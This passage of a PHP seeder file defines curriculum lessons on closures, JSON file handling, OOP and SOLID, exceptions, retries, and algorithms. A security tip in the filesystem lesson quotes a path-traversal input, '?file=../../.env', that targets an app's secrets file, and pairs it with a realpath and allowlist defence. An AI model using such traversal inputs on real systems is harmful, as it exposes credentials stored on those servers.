                        ['The toolkit that replaces most loops', '<code>array_map</code> transforms each element, <code>array_filter</code> keeps matches, <code>array_reduce</code> folds to a single value, <code>array_column</code> plucks a field from rows, <code>array_key_exists</code> tests presence, <code>array_merge</code> combines, and <code>sort</code>/<code>asort</code>/<code>usort</code> order. Reach for these before hand-writing a <code>foreach</code> with an accumulator — the result reads as intent, not mechanics.'],
                        ['Three iteration shapes you will write a thousand times', '<pre><code>foreach ($rows as $row) {}            // values\nforeach ($map as $k => $v) {}         // keys + values\narray_walk($map, fn($v, $k) => ...);  // callback with both</code></pre>'],
                        ['Pitfalls, each one waiting on real data', '<ul><li><strong>Modifying the array inside its own foreach</strong> — skipped or repeated elements; snapshot the ids/keys first, or rebuild with <code>array_filter</code></li><li><strong><code>isset($a[$k])</code> returns false for a stored null</strong> — when the distinction matters, use <code>array_key_exists</code></li><li><strong>Mixing list and map usage</strong> — appending numeric keys onto an array that also has string keys produces confusing iteration order; pick one model per variable</li></ul>'],
                        ['Practice it out loud', 'Take an array of user rows and compute "top 3 active users by score" purely with <code>array_filter</code> + <code>array_column</code> + <code>usort</code> — no manual loop — then explain each step.'],
                        ['Interview drill', 'array vs SplFixedArray vs object properties — when does each earn its place, and what does PHP optimize away?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-4', 'code' => 'E2', 'slug' => 'e2-closures', 'order' => 1, 'sort' => 14,
                'title' => 'E2 — Closures, use, Higher-Order Functions',
                'summary' => 'Anonymous functions, use by value/ref, arrow fns, map/filter pipelines.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'E2 — Closures',
                    'Stage 4 · Arrays & Strings · PHP 8.x',
                    [
                        ['A function you can pick up and pass around', 'Until now a function existed only by name. A <strong>closure</strong> is an anonymous function stored in a value — you can hand it to <code>array_map</code>, put it in a queue, or return it from another function. Crucially, it can also <em>capture</em> the variables that were in scope where it was born, which is what makes it more than syntax sugar.'],
                        ['Three syntaxes, one concept', '<pre><code>$factor = 2;\n$mul = fn($n) => $n * $factor;      // arrow fn: captures by value automatically\n$add = function($n) use ($factor) { return $n + $factor; };\n\narray_map($mul, [1,2,3]);           // [2,4,6]</code></pre> <p>The arrow function is the everyday choice: expression-only body, one implicit capture, always by value. The <code>function() use (...)</code> form remains for multi-statement bodies and for the by-reference capture you meet next. Same idea — different ceremony.</p>'],
                        ['use (&amp;$count): the capture that mutates the outside', 'Capturing by reference lets the closure change the variable of the enclosing scope. It is occasionally exactly what a counter needs — and frequently the way a hidden bug is born, because code far from the closure can no longer predict that variable\'s value. Ask "who can write this variable?" and if the answer includes a closure someone else owns, pass a value in and return a value out instead.'],
                        ['Pipelines read as intent when written carefully', '<pre><code>$emails = array_values(\n    array_filter(\n        array_map(fn($u) => $u->email, $users),\n        fn($e) => str_contains($e, "@")\n    )\n);</code></pre> <p>That is map → filter → reindex in three moves. Compressed one-liners work too — but in code review, named intermediate variables usually win, because each line can be commented and debugged on its own. Style choice, not religion: readable beats clever.</p>'],
                        ['Practice it out loud', 'Write one array pipeline with two arrow functions, then rewrite it as a plain foreach loop — and explain which version a junior teammate would debug faster.'],
                        ['Interview drill', 'What does an arrow function capture, and how does that differ from an explicit <code>use</code> clause? When does capturing by reference become a bug?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-4', 'code' => 'E3', 'slug' => 'e3-filesystem-json', 'order' => 2, 'sort' => 15,
                'title' => 'E3 — Filesystem, CLI I/O, JSON',
                'summary' => 'file_get_contents, JSON encode/decode, validation, atomic writes.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => true,
                'body' => $this->body(
                    'E3 — Filesystem & JSON',
                    'Stage 4 · Arrays & Strings · PHP 8.x',
                    [
                        ['Reading, writing, and the crash in between', 'The four functions below are 90% of PHP file work — but notice the last two lines, which are the part production code must not skip: <pre><code>$raw = file_get_contents($path) ?: null;\n$json = json_encode($data, JSON_PRETTY_PRINT | JSON_THROW_ON_ERROR);\n$data = json_decode($json, true, 512, JSON_THROW_ON_ERROR);\nfile_put_contents($path.".tmp", $json);\nrename($path.".tmp", $path); // atomic-ish swap</code></pre> <p>Write to a temp file, then <code>rename()</code> over the real one. Why: <code>rename()</code> on the same filesystem is atomic, so a crash mid-write leaves either the old file or the new file — never a half-written 3 KB that corrupts every future load. Skipping this step is how apps lose their config file during a power cut.</p>'],
                        ['JSON errors must be exceptions, not silence', 'By default <code>json_decode</code> returns <code>null</code> on invalid JSON and floods warnings; <code>JSON_THROW_ON_ERROR</code> converts that into a catchable <code>JsonException</code> at the boundary where you can still explain what failed. The <code>true</code> flag asks for associative arrays instead of stdClass objects — the shape every Laravel config/array pipeline expects.'],
                        ['Paths from user input are an attack surface', 'Concatenating request data into a path is how <code>?file=../../.env</code> walks out of your directory. Resolve with <code>realpath()</code> and verify the result sits inside an allowlisted base directory, or map an id to a filename yourself. The rule: user input names <em>choices</em>, never filesystem paths.'],
                        ['Where this lands in your projects', 'The expense tracker and contact book from Stage 4 persist exactly this way: load JSON at start, mutate an array in memory, save on change with the temp-file swap. Simple, debuggable, and honest about its limits — a single-writer tool does not need a database.'],
                        ['Practice it out loud', 'Build the load/save pair, then kill your script with <code>exit</code> between <code>file_put_contents</code> and <code>rename</code> on purpose — confirm the original file is still intact.'],
                        ['Interview drill', 'Why temp file plus <code>rename</code>? What does <code>json_decode($s, true)</code> return versus <code>json_decode($s)</code>?'],
                    ],
                ),
            ],

            // --- Stage 5 ---
            [
                'stage' => 'stage-5', 'code' => 'F1', 'slug' => 'f1-classes-objects', 'order' => 0, 'sort' => 16,
                'title' => 'F1 — Classes, Objects, Constructors',
                'summary' => 'Why OOP; class vs object; properties; __construct; property promotion.',
                'difficulty' => 'beginner', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'F1 — Classes & Objects',
                    'Stage 5 · OOP → SOLID · PHP 8.x',
                    [
                        ['The pain that objects were invented to solve', 'A growing procedural script scatters its state across ten global arrays and the functions that mutate them, and every change risks breaking a caller three files away. The fix is bundling: put the data and the operations on that data in one place so a change to one keeps its own company. A <strong>class</strong> is the blueprint; an <strong>object</strong> is a concrete instance built from it — the same distinction as "recipe" versus "cake".'],
                        ['One object, start to finish', '<pre><code>class Expense {\n    public function __construct(\n        public string $category,\n        public float $amount,\n    ) {}\n\n    public function label(): string {\n        return "{$this->category}: {$this->amount}";\n    }\n}\n\n$e = new Expense("food", 12.5);\necho $e->label();   // food: 12.5</code></pre> <p>Two things to notice: the class owns both the state (<code>category</code>, <code>amount</code>) and the behaviour on that state (<code>label()</code>) — that pairing is the whole idea. And the constructor uses <strong>property promotion</strong>: those parameter declarations <em>are</em> the property declarations, PHP 8\'s answer to five lines of boilerplate per value object.</p>'],
                        ['Promotion without the mystery', '<code>public string $category</code> in the constructor signature simultaneously declares a public property and assigns the passed argument to it. Add <code>readonly</code> and the value can be set once at construction and never again — the default shape for value objects in modern PHP.'],
                        ['When NOT to reach for a class', 'A bag of getters around an array, or a "god object" that holds half the application\'s state, is OOP theatre: the structure is there, the benefit is not. If a plain function and a typed array say the same thing more clearly — and the data never needs invariants — YAGNI wins. Classes earn their keep when there is behaviour to coordinate with state, not before.'],
                        ['Practice it out loud', 'Model one real thing from your daily life (a ticket, a bank account, a playlist) with two fields and two methods, then explain to a colleague which method could not exist as a free function because it reads its own state.'],
                        ['Interview drill', 'class vs object? What does constructor property promotion buy you — and when is a plain function the better choice?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-5', 'code' => 'F2', 'slug' => 'f2-encapsulation', 'order' => 1, 'sort' => 17,
                'title' => 'F2 — Visibility & Encapsulation',
                'summary' => 'public/protected/private; invariants; why visibility exists.',
                'difficulty' => 'beginner', 'minutes' => 30, 'checkpoint' => false,
                'body' => $this->body(
                    'F2 — Encapsulation',
                    'Stage 5 · OOP → SOLID · PHP 8.x',
                    [
                        ['Visibility is a promise about what you may touch', 'Three keywords, three contract levels: <ul><li><strong>public</strong> — part of the class\'s API; anyone may call it, and you must keep it working</li><li><strong>protected</strong> — for subclasses and the class family; closer to an internal API than a public one</li><li><strong>private</strong> — an implementation detail you reserve the right to rewrite tomorrow</li></ul> <p>The payoff is not secrecy — it is <em>freedom to change</em>. A private field can be renamed, restructured, or replaced by a computation without touching a single caller, because there are no callers to break.</p>'],
                        ['Invariants: rules the class refuses to break', 'A wallet balance must never go negative; an order\'s quantity must be positive. These are <strong>invariants</strong> — facts that must hold after every operation. You enforce them in methods, not by hoping callers of public fields behave: make the field private, expose operations that validate, and the invalid states become unrepresentable rather than merely discouraged.'],
                        ['The pattern that makes invariants real', '<pre><code>class Wallet {\n    private float $balance = 0.0;\n\n    public function deposit(float $n): void {\n        if ($n &lt;= 0) { throw new InvalidArgumentException(); }\n        $this->balance += $n;\n    }\n\n    public function balance(): float { return $this->balance; }\n}</code></pre> <p>Predict what happens if you delete <code>private</code>: callers can now run <code>$wallet-&gt;balance = -999</code> directly and the invariant is gone. The read-only accessor <code>balance()</code> gives observers the data without the ability to corrupt it — information flows out, invalid writes cannot come in.</p>'],
                        ['Why "make everything public" fails code review', 'Public fields turn every internal decision into a public API: rename one property and half the codebase lights up. Senior reviewers read <code>public $x</code> on a domain object as an open invitation for logic to grow <em>outside</em> the class that owns the rule — which is precisely the scattering F1 set out to fix.'],
                        ['Practice it out loud', 'Take one class you wrote with public properties, seal the fields, add one validated mutator, and list which illegal states just became impossible.'],
                        ['Interview drill', 'Why not make everything public? How does a private field plus a validating method protect an invariant that public fields cannot?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-5', 'code' => 'F3', 'slug' => 'f3-inheritance-polymorphism', 'order' => 2, 'sort' => 18,
                'title' => 'F3 — Inheritance, Interfaces, Polymorphism',
                'summary' => 'extends; abstract; interfaces; LSP; when inheritance is wrong.',
                'difficulty' => 'intermediate', 'minutes' => 40, 'checkpoint' => false,
                'body' => $this->body(
                    'F3 — Inheritance & Polymorphism',
                    'Stage 5 · OOP → SOLID · PHP 8.x',
                    [
                        ['Inheritance is "is-a" — and most codebases overuse it', '<code>class Admin extends User</code> says an admin <em>is a</em> user with extra rights: shared fields, shared methods, one override point. It shines when the hierarchy is true and stable (a cat is a mammal). It ages badly when the relationship is convenient rather than real — force <code>Duck extends Bird</code> and someone eventually adds <code>fly()</code> that penguins must throw exceptions for. That crack is LSP showing up (next section).'],
                        ['Interfaces: a contract with no opinions about implementation', '<pre><code>interface Payable {\n    public function pay(float $amount): bool;\n}\n\nclass StripeGateway implements Payable { /* ... */ }\nclass PaypalGateway  implements Payable { /* ... */ }</code></pre> <p>An interface says <em>what</em> must be callable, never <em>how</em>. Two unrelated classes can satisfy the same contract, callers depend on the interface rather than either vendor, and tests swap in a fake with zero production edits. PHP allows implementing many interfaces — which is exactly why they, not inheritance, express cross-cutting capabilities.</p>'],
                        ['Abstract classes: a partial blueprint', 'When several siblings share real implementation <em>and</em> state, an abstract class can hold common code while leaving selected methods unimplemented for children to complete. The distinction from an interface: an abstract class can carry fields and concrete methods; a class extends one of them but implements many interfaces.'],
                        ['Polymorphism is the point of both', 'The same method call — <code>$payable-&gt;pay(10.0)</code> — takes different paths depending on the concrete type, while the caller stays ignorant of which. That ignorance is the feature: add a third gateway and no caller changes. This is what "program to an interface" means in practice, not in the abstract.'],
                        ['LSP: substitutability is the law that keeps it honest', 'A subtype must drop in wherever its parent is expected without breaking the caller. A <code>DiscountStrategy</code> that throws "not allowed" for one input violates that: code written against the parent now has a new failure mode it never checked. The interface-vs-abstract interview question is really asking: which structure lets you keep this promise?'],
                        ['Practice it out loud', 'Design two classes and one interface: name the interface by the <em>verb</em> callers use, then show how a test fake satisfies it.'],
                        ['Interview drill', 'interface vs abstract class? Give a concrete example of bad inheritance — and name the principle it violates.'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-5', 'code' => 'F4', 'slug' => 'f4-composition-solid', 'order' => 3, 'sort' => 19,
                'title' => 'F4 — Composition over Inheritance + SOLID',
                'summary' => 'Favor has-a; five SOLID principles with code smells; DI introduction.',
                'difficulty' => 'intermediate', 'minutes' => 45, 'checkpoint' => false,
                'body' => $this->body(
                    'F4 — Composition & SOLID',
                    'Stage 5 · OOP → SOLID · PHP 8.x',
                    [
                        ['Has-a survives change better than is-a', 'Inheritance couples a child to its parent\'s internals forever; composition hands an object a collaborator it talks to through an interface: <pre><code>class Order {\n    public function __construct(private Pricing $pricing) {}\n\n    public function total(): float {\n        return $this->pricing->for($this);\n    }\n}</code></pre> <p>Swap <code>Pricing</code> for a holiday-discount implementation and <code>Order</code> does not change — the collaborator was injected, not baked in. This one move gives you the swap, the test fake, and the future refactor in a single stroke, which is why "favour composition over inheritance" is the most applied sentence in OO design.</p>'],
                        ['SOLID, said the way you will use it', '<ul><li><strong>S</strong>ingle responsibility — one reason to change; a class that formats dates <em>and</em> queries the DB has two</li><li><strong>O</strong>pen/closed — add behaviour by adding code (a new strategy), not by editing stable code every time</li><li><strong>L</strong>iskov — subtypes stay substitutable (F3\'s law, restated)</li><li><strong>I</strong>nterface segregation — small focused interfaces beat one fat one nobody can implement fully</li><li><strong>D</strong>ependency inversion — high-level logic depends on abstractions you own, not on framework concretes</li></ul>'],
                        ['The smells that tell you SOLID is missing', 'A god class growing a method per feature. Shotgun surgery — one requirement touching ten files. Copy-paste subclasses differing by a flag. Each smell points at the same prescription: extract an interface, inject a collaborator, move the branch into a strategy.'],
                        ['Read it in this repository first', 'Open <code>app/Models/User.php</code> and <code>app/Actions/Fortify/CreateNewUser.php</code>: visibility and promotion in the model, the single-purpose Action class doing one job — the "action pattern" that keeps controllers thin. You are not studying sample code; you are reading the code you already run.'],
                        ['Practice it out loud', 'Take a class with an <code>if/else</code> over two payment providers and refactor it to a <code>PaymentGateway</code> interface with two implementations — narrate each step as if pairing with a junior.'],
                        ['Interview drill', 'Explain composition vs inheritance using payments: where would you draw the line between what an <code>Order</code> <em>is</em> and what it <em>has</em>?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-5', 'code' => 'F5', 'slug' => 'f5-namespaces-enums', 'order' => 4, 'sort' => 20,
                'title' => 'F5 — Namespaces, Enums, readonly, Attributes',
                'summary' => 'PSR-4 autoloading; enums; readonly properties; attributes as metadata.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => true,
                'body' => $this->body(
                    'F5 — Namespaces, Enums & Modern PHP',
                    'Stage 5 · OOP → SOLID · PHP 8.x',
                    [
                        ['Namespaces keep class names unique — autoloading keeps you from typing require', 'A <code>namespace App\Models;</code> declaration scopes the class name so <code>User</code> can exist in both <code>App\Models</code> and <code>Vendor\Auth</code> without collision. Composer\'s PSR-4 rule then removes file-include bookkeeping entirely: <code>App\Models\User</code> maps to <code>app/Models/User.php</code> by convention — namespace separators become directory separators, and the class appears the moment you use it.'],
                        ['Enums turn stringly-typed constants into a type', '<p>Before enums, a role was <code>"admin"</code> typed into six files — a typo compiles fine and fails at runtime. From PHP 8.1:</p><pre><code>enum Role: string {\n    case Student = "student";\n    case Admin = "admin";\n}\n\nRole::Admin->value;  // "admin" for storage\nRole::from("admin"); // throws on garbage input</code></pre> <p>Now a wrong value is a <code>ValueError</code> at the boundary, <code>match</code> on cases exhaustively checks itself, and the domain vocabulary is visible in the signature. Backed enums (<code>: string</code>/<code>: int</code>) serialize straight to the database and back.</p>'],
                        ['readonly: immutable by declaration', '<code>public readonly string $id;</code> is writable exactly once — at construction — and any later assignment is an Error. That single keyword makes value objects (money, ids, DTOs passed between layers) safe to share: if nobody can mutate it after creation, there is no aliasing bug to chase. Set it in the constructor, never again.'],
                        ['Attributes are metadata a tool reads — PHP never runs them by itself', 'An attribute like <code>#[Test]</code> or a route annotation is a labelled note attached to a class, method, or parameter. The engine parses it and does nothing; a <em>reader</em> — Pest, Laravel, or your own script — discovers it and acts. This is how configuration lives beside the code it configures instead of in a parallel file that drifts out of sync.'],
                        ['Reflection: asking the runtime about itself', '<pre><code>$ref = new ReflectionClass(Health::class);\nforeach ($ref->getAttributes() as $attr) {\n    echo $attr->getName();\n}</code></pre> <p><code>ReflectionClass</code>, <code>ReflectionMethod</code>, and <code>getAttributes()</code> let tools enumerate parameters, types, and metadata at runtime — which is exactly how Laravel\'s container resolves constructor dependencies and how serializers walk your objects. Learn to <em>read</em> with it before you use it in app logic: reflection in hot paths is slow, and using it where a plain method call would do hides the call from readers.'],
                        ['Practice it out loud', 'Convert a config array of string constants into an enum, then use Reflection in a five-line script to print every case — explain who benefits from each change.'],
                        ['Interview drill', 'How does autoload resolve <code>App\Services\CodeRunner</code>? What can <code>ReflectionClass</code> discover at runtime — and when is reaching for it a design smell?'],
                    ],
                ),
            ],

            // --- Stage 6 ---
            [
                'stage' => 'stage-6', 'code' => 'G1', 'slug' => 'g1-error-model', 'order' => 0, 'sort' => 21,
                'title' => 'G1 — Error vs Exception; Throwable Tree',
                'summary' => 'Error vs Exception; Throwable hierarchy; when to catch each.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'G1 — Error Model',
                    'Stage 6 · Errors & Exceptions · PHP 8.x',
                    [
                        ['Two families under one roof', 'Everything throwable in PHP implements <code>Throwable</code>, and the tree splits immediately into <code>Error</code> and <code>Exception</code>. The split is not severity — it is <em>who should act</em>. An exception is a question the caller may be able to answer ("the card was declined — retry?"); an error is a statement that the program itself is wrong ("you called a method on null").'],
                        ['Errors: bugs and environment, not business events', '<code>TypeError</code>, <code>ValueError</code>, <code>DivisionByZeroError</code>, <code>OutOfMemoryError</code> — these mean a contract was violated or a resource ran out. You do not "handle" a TypeError and continue; you find the line that passed the wrong type and fix it. Catching an Error to keep the request alive usually converts a loud bug into a quiet wrong answer.'],
                        ['Exceptions: events a caller can legitimately recover from', '<code>PaymentDeclinedException</code>, a validation failure, a missing record — the caller knows what each means and can decide: retry, fall back, or report to the user. That decision power is what makes exceptions a control-flow tool instead of a crash mechanism.'],
                        ['The hierarchy you will navigate in every catch', '<pre><code>Throwable\n  ├── Error\n  │     ├── TypeError, ValueError, ArithmeticError, OutOfMemoryError...\n  └── Exception\n        ├── RuntimeException\n        │     └── domain exceptions you create (extend these)\n        └── LogicException</code></pre> <p>Rule of thumb visible in the shape: catch <code>LogicException</code>-family bugs by fixing code, catch <code>RuntimeException</code>-family events by handling them. Your own exceptions extend <code>RuntimeException</code> when recovery is possible, <code>LogicException</code> when the caller misused the API.</p>'],
                        ['When catching Throwable is actually right', 'The top-level handler of a request or queue job catches <code>Throwable</code> — not to swallow, but to guarantee a 500 response, a failed-job row, and a log entry instead of a white screen. Narrow catches live deeper; one wide net lives at the edge. That layering is the design.'],
                        ['Practice it out loud', 'Throw a custom exception from a function and let it go uncaught — read the fatal trace top to bottom and name the frames that are framework versus your code.'],
                        ['Interview drill', 'When would you catch <code>Throwable</code> rather than <code>Exception</code>? What does catching an <code>Error</code> inside business logic signal to a reviewer?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-6', 'code' => 'G2', 'slug' => 'g2-try-catch-custom', 'order' => 1, 'sort' => 22,
                'title' => 'G2 — try/catch/finally; Custom Exceptions',
                'summary' => 'Propagation, finally, custom types, multi-catch, rethrow.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'G2 — Exceptions in Practice',
                    'Stage 6 · Errors & Exceptions · PHP 8.x',
                    [
                        ['try/catch/finally in the shape you will actually write', '<pre><code>try {\n    $order = $repo->find($id);\n} catch (OrderNotFoundException $e) {\n    return Response::notFound();\n} finally {\n    $log->debug("lookup done");\n}</code></pre> <p>Read it as a sentence: attempt the risky operation, answer the specific failure you expect, and always run cleanup. The <code>finally</code> block executes whether the try succeeded, the catch ran, or a <em>different</em> exception is already propagating — which makes it the correct home for releasing a file handle, closing a cursor, or finishing a stopwatch. It even runs on return, so cleanup cannot be skipped by an early exit.</p>'],
                        ['Propagation: the exception climbs until someone answers', 'If no <code>catch</code> matches, PHP unwinds the stack — each frame\'s <code>finally</code> blocks run on the way out — until a matching catch or the framework\'s top-level handler takes over. That is why you do not need to catch at every layer: handle at the layer that can <em>do something useful</em> with the failure, and let the rest propagate with context.'],
                        ['Custom exception types are domain vocabulary', '<pre><code>class PaymentFailed extends RuntimeException {}\nclass OrderNotFoundException extends RuntimeException {}\n\ncatch (OrderNotFoundException | PaymentFailed $e) { /* multi-catch */ }</code></pre> <p>One class per failure your domain distinguishes turns <code>catch</code> clauses into readable policy — and lets callers catch narrowly instead of swallowing everything. Multi-catch (<code>|</code>) groups failures that get the same response without collapsing them into one vague type.</p>'],
                        ['Context for logs, safety for users', 'Attach the message and code a future debug session will need — ids, amounts, provider response. But never let SQL strings, tokens, or stack traces reach a user-facing message: log the detail, show safe text. The exception message is written for your logs first and your users not at all.'],
                        ['When to rethrow', 'Catch only when you add value: handle it, translate it to a domain error, or wrap it with context and rethrow. A catch that logs and rethrows the identical exception unchanged is noise — the layer above gets the same information with one more frame to read.'],
                        ['Practice it out loud', 'Build a three-function call chain where the deepest throws; catch in the middle; add a <code>finally</code> with an echo and observe it firing in both the success and failure runs.'],
                        ['Interview drill', 'What does <code>finally</code> guarantee? Why would you rethrow an exception you already caught?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-6', 'code' => 'G3', 'slug' => 'g3-recovery-strategies', 'order' => 2, 'sort' => 23,
                'title' => 'G3 — Fail-fast, Recovery, Logging, Retries',
                'summary' => 'When to fail fast vs degrade; logging vs throwing; retries/timeouts.',
                'difficulty' => 'advanced', 'minutes' => 40, 'checkpoint' => true,
                'body' => $this->body(
                    'G3 — Failure Handling Strategies',
                    'Stage 6 · Errors & Exceptions · PHP 8.x',
                    [
                        ['Fail fast when the state is already wrong', 'Invalid configuration at boot, a null collaborator, a negative quantity — these should throw immediately, at the boundary where the cause is still obvious. Catching them and returning <code>null</code> (or worse, <code>false</code>) just relocates the failure: the bug now surfaces ten frames away as a confusing TypeError with no hint of the original mistake. Loud-and-early is kindness to whoever reads the stack trace — including future you.'],
                        ['Recover when the failure is temporary and understood', 'A network blip on a payment call is not a bug — it is a condition. The recipe: bounded retries with exponential backoff (1s, 2s, 4s…), a hard timeout per attempt, and a ceiling after which you surface a real error. An optional feature being down degrades gracefully: skip the recommendation rail, still render the page. The test for "recovery": name the condition you are waiting to stop being true.'],
                        ['Throwing is control flow; logging is observability', 'Throw when a <em>caller</em> must make a decision — that is data moving up the stack. Log when you need to <em>see</em> an unexpected path later — that is data moving to your future self. Structured logs (level, context, request id) beat <code>echo</code> because they are queryable when the 2 a.m. page comes in. Confusing the two gives you either exceptions used as print statements or silent failures nobody can reconstruct.'],
                        ['The two lines that define a broken error handler', '<pre><code>try { $x = risky(); } catch (Throwable $e) {} // swallow — worst code shape</code></pre> <p>An empty catch asserts "every possible failure here is fine" — an assertion almost never true. The fix is either to catch <em>specific</em> types you genuinely handle, transform them into domain errors with context, or rethrow with added information. Never catch wide and do nothing.</p>'],
                        ['Designing a payment API with a flaky provider', 'Walk it end to end: validate input up front (fail fast), call the provider with timeout + retry/backoff for transient 5xx/network errors (recover), treat hard declines as domain exceptions the caller displays (specific type), make the whole handler idempotent so a retry cannot double-charge (the senior detail), and emit a structured log + metric per outcome so you can see provider health tomorrow.'],
                        ['Practice it out loud', 'Wrap a call that fails 1 time in 3 with retry + backoff; count attempts in a log line; then explain where you would draw the line between "retry" and "alert a human".'],
                        ['Interview drill', 'Design error handling for a payment API with a flaky provider — which failures retry, which fail fast, and what makes the retry safe?'],
                    ],
                ),
            ],

            // --- Stage 7 ---
            [
                'stage' => 'stage-7', 'code' => 'H1', 'slug' => 'h1-big-o-complexity', 'order' => 0, 'sort' => 24,
                'title' => 'H1 — Big O & Complexity Thinking',
                'summary' => 'Time/space complexity; common classes; measuring before optimizing.',
                'difficulty' => 'intermediate', 'minutes' => 30, 'checkpoint' => false,
                'body' => $this->body(
                    'H1 — Big O',
                    'Stage 7 · Data Structures & Algorithms · CS',
                    [
                        ['Big O answers one question: how work grows with input', 'Not "how many milliseconds" — that depends on your machine — but "if the input doubles, what happens to the work?". Big O describes that growth rate and deliberately ignores constants and hardware: an algorithm doing 3n steps and one doing n are both <code>O(n)</code>, because both double when the input doubles. You are measuring the <em>shape</em> of the curve, not its height.'],
                        ['The five curves you will meet in every interview', '<ul><li><code>O(1)</code> — hash lookup, array index: flat regardless of size</li><li><code>O(log n)</code> — binary search: each step halves the range</li><li><code>O(n)</code> — a single scan of all elements</li><li><code>O(n log n)</code> — good comparison sorts (quicksort, mergesort)</li><li><code>O(n²)</code> — nested loops over the same data</li></ul> <p>Memorise them as <em>behaviour at scale</em>: at n = 100,000 an <code>O(n²)</code> job performs 10 billion operations while <code>O(n log n)</code> performs about 1.7 million — the gap that turns a fast script into a hung request.</p>'],
                        ['Why a "tiny" nested loop is never tiny', 'Development data is polite — fifty rows, instant answers. Production data is not: the first real customer with 100k rows explodes the quadratic. The eye-check that catches it is simple: two loops iterating over the same collection, or a lookup done inside a loop without a hash index — repeated scans of the whole input are the signature.'],
                        ['Measure before you optimise — the senior reflex', 'Correctness, then clarity, then performance — in that order. "Feels slow" is not data: profile, or at least time it, find the actual hotspot, and only then tune. The commonest wasted week in this industry is optimising the <code>O(n)</code> part while the real cost was one missing index sending <code>O(n)</code> queries to the database.'],
                        ['Practice it out loud', 'Classify each before reading further: a <code>foreach</code> with <code>array_key_exists</code>; sorting then scanning; looking up a key in an array; recursing with no memo. (Answers: O(n) with hash lookups, O(n log n), O(1) average, exponential.)'],
                        ['Interview drill', 'What is the complexity of a foreach loop doing <code>array_key_exists</code> per row — and what one change would improve it if the "exists" test were the bottleneck?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-7', 'code' => 'H2', 'slug' => 'h2-searching-sorting', 'order' => 1, 'sort' => 25,
                'title' => 'H2 — Searching & Sorting Patterns',
                'summary' => 'Linear vs binary search; comparison sorts; stable vs unstable; built-ins.',
                'difficulty' => 'intermediate', 'minutes' => 35, 'checkpoint' => false,
                'body' => $this->body(
                    'H2 — Search & Sort',
                    'Stage 7 · Data Structures & Algorithms · CS',
                    [
                        ['Searching: pay for the data\'s order', 'Linear search walks element by element — <code>O(n)</code>, works on anything, and the right answer when the data is unsorted or tiny. Binary search exploits sorted order: compare the midpoint, discard half, repeat — <code>O(log n)</code>, but only legal if (and only if) the input is sorted with a consistent comparator. The precondition is the whole trick: applying binary search to unsorted data does not degrade gracefully, it returns wrong answers.'],
                        ['Sorting: the floor you cannot go below', 'Comparison-based sorts cannot beat <code>Ω(n log n)</code> — that is a proven bound, not a lack of cleverness. PHP gives you <code>sort</code> (by value, reindex), <code>asort</code> (by value, keep keys), <code>ksort</code> (by key), and <code>usort</code> with a comparator: <code>usort($rows, fn($a, $b) => $a["score"] <=> $b["score"])</code>. The spaceship operator from B1 is exactly the -1/0/1 shape these expect.'],
                        ['Stability: the property multi-key sorting depends on', 'A <strong>stable</strong> sort preserves the original order of equal elements. That sounds academic until you sort twice — scores descending, then names ascending — and need the second sort not to scramble the first. The standard technique is to sort by the least significant key first and rely on stability to carry the earlier order forward.'],
                        ['The two patterns that solve most subarray problems', '<strong>Two pointers</strong>: two indices walking toward each other (or one chasing the other) for pair sums, deduplication, and in-place merges. <strong>Sliding window</strong>: maintain a valid range and expand/contract one edge at a time for longest-unique-substring and max-window-sum — each element enters and leaves once, so <code>O(n)</code>. Plus the evergreen: "seen it before?" questions are answered with a hash set in one pass.'],
                        ['Practice it out loud', 'Implement binary search on paper for <code>[1,3,5,7,9]</code> searching 7, then searching 4 — narrate every range update, then list the three off-by-one bugs you would check for in code (mid calculation, loop vs recursive exit, inclusive/exclusive bounds).'],
                        ['Interview drill', 'Write binary search; then handle a missing value and duplicate values — what does your return convention say, and did you decide it before or after writing the loop?'],
                    ],
                ),
            ],
            [
                'stage' => 'stage-7', 'code' => 'H3', 'slug' => 'h3-trees-graphs-dp', 'order' => 2, 'sort' => 26,
                'title' => 'H3 — Trees, Graphs, BFS/DFS, DP Patterns',
                'summary' => 'Traversal; queues vs stacks; memoization; recognizing DP.',
                'difficulty' => 'advanced', 'minutes' => 45, 'checkpoint' => true,
                'body' => $this->body(
                    'H3 — Trees, Graphs, DP',
                    'Stage 7 · Data Structures & Algorithms · CS',
                    [
                        ['Trees: the hierarchy you already read every day', 'A tree is nodes with exactly one parent (except the root). A BST adds an ordering rule — left less, right greater — which is what makes <code>O(log n)</code> lookup possible when the tree stays balanced. Traversal comes in two families: <strong>DFS</strong> (pre/in/post-order; a stack or recursion) dives deep before it widens — natural for printing a nested structure or validating subtrees — and <strong>BFS</strong> (level-order; a queue) visits by depth, which is how you print a tree level by level or find the shallowest path.'],
                        ['Graphs: remove the single-parent rule and everything gets harder', 'Nodes and edges with no tree constraint — cycles now exist, so "visited" bookkeeping becomes mandatory. The <strong>adjacency list</strong> (map of node → neighbours) is the default representation: sparse graphs pay only for edges that exist. Then the split: <strong>BFS</strong> gives the shortest path in an <em>unweighted</em> graph (first time you reach a node, you reached it by the fewest hops); <strong>DFS</strong> answers reachability, cycle detection, and topological-order questions. Choose by the shape of the question, not by habit.'],
                        ['Dynamic programming: memoise a recursion you have already written', 'DP applies when a problem has <strong>optimal substructure</strong> (the best answer is built from best sub-answers) <em>and</em> <strong>overlapping subproblems</strong> (the naive recursion recomputes the same slice many times). Fibonacci shows both: naive recursion revisits fib(3) exponentially; a memo array turns it into one computation per n — <code>O(n)</code> time, <code>O(n)</code> space. The table-driven alternative (build answers bottom-up) trades readability for no recursion overhead.'],
